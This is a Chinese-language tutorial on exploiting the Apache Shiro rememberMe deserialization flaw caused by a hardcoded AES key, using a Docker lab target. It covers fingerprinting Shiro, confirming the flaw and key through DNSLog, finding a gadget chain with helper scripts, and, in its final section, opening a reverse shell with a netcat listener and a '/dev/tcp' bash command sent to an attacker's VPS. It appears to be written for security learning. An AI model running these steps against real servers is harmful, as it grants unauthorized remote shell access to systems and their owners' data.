0X00 漏洞原因：

shiro提供的rememberMe功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。而其中对rememberMe的cookie做了加密处理，漏洞主要原因是加密的AES密钥是硬编码在文件中的，那么对于对称加密的AES加密算法我们已知密钥，并且IV为cookie进行base64解码后的前16个字节，因此我们可以构造任意的可控序列化payload

shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：

得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化

0X01 漏洞环境搭建

下载docker镜像

docker pull medicean/vulapps:s_shiro_1

启动docker镜像

docker run -d -p 9000:8080 medicean/vulapps:s_shiro_1

访问

http://localhost:9000/ 环境搭建成功

0X02、如何识别shiro

在cookie中添加rememberMe=1，如果响应头中存在deleteME=1,则使用了shiro

0x03 如何检测是否存在shiro漏洞

一种较为简单的检测方式就是Ysoserial的URLDN + DNSLog

DNSlog可以使用http://www.dnslog.cn/ 提供的dnslog服务
也可以自行搭建dnslog服务

如何搭建dnslog服务

首先需要一个域名，添加两条域名解析
这里以域名为shiro.com，服务器ip为6.6.6.6为例
dns NS 默认 ns.shiro.com
ns A 默认 6.6.6.6

然后在服务器上执行python3 dnslog.py

然后本地执行ping dnslogtest.dns.shiro.com
查看vps是否产生dns解析,有即为配置成果

如何确认漏洞存在并确认key值

shiro的攻击原理是通过固定的AES密钥来进行payload的构造，所以需要进行AES密钥的测试
python shiroKeyTest.py -u http://localhost:9000/

然后查看vps的dnslog，shiroKeyTest.py会发起请求，携带key发起请求。
服务器会接收到如下的请求
shiroKey.dns.shiro.com
这样就可以确定shiro漏洞的存在以及key值

0x04 如何利用

寻找利用链

运行dnslog.py，接着运行shiroCCTest.py，将上一步获得的key值填入后执行脚本。在dns解析记录中获取利用链

python3 shiroCCTest.py -u http://[靶机地址]

反弹shell

vps监听端口
nc -lvv -p 1111

然后执行：
python3 shiroRce.py "echo '/bin/bash -i >& /dev/tcp/你的vps的公网ip/1111 0>&1' >> a.txt &&bash a.txt"

将生成的cookie通过burp发送，查看vps成功反弹shell
